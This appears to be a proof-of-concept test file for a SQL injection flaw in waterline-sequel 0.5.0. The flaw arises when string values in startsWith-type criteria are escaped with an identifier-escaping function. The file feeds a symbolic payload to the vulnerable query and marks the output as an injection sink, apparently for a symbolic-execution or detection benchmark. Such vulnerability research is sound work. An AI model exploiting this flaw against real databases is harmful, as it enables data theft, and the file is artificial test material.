/**
 * PoC: SQL Injection in waterline-sequel 0.5.0
 *
 * Vulnerability: when parameterized: false, prepareCriterion() for
 * startsWith/contains/endsWith/like uses utils.escapeName() (meant
 * for SQL identifiers) to escape string values, allowing SQL injection.
 */

var Sequel = require('waterline-sequel');
var Symbolic = require('esl_symbolic');

// --- waterline-sequel setup ---

var schema = {
  foo: {
    tableName: 'foo',
    attributes: {
      color: 'string',
      id: { type: 'integer', primaryKey: true, autoIncrement: true, unique: true }
    }
  }
};

var options = {
  parameterized: false,
  caseSensitive: false,
  escapeCharacter: '`',
  casting: false,
  canReturnValues: false,
  escapeInserts: true
};

var sequel = new Sequel(schema, options);

// 1. Safe query (normal startsWith)
console.log('[1] Safe query: color startsWith "red"');
var safeResult = sequel.find('foo', {
  where: { color: { startsWith: 'red' } },
  instructions: {}
});
console.log('    Generated SQL: ' + safeResult.query[0]);

// 2. Vulnerable query: SQL injection via startsWith
console.log('[2] VULNERABLE query: color startsWith malicious payload');
var payload = Symbolic.string('payload');
Symbolic.assume(payload !== '');
var vulnResult = sequel.find('foo', {
  where: { color: { startsWith: payload } },
  instructions: {}
});
console.log('    Generated SQL: ' + vulnResult.query[0]);

Symbolic.sinkCall("sql-injection", "sequel.find", vulnResult.query[0]);
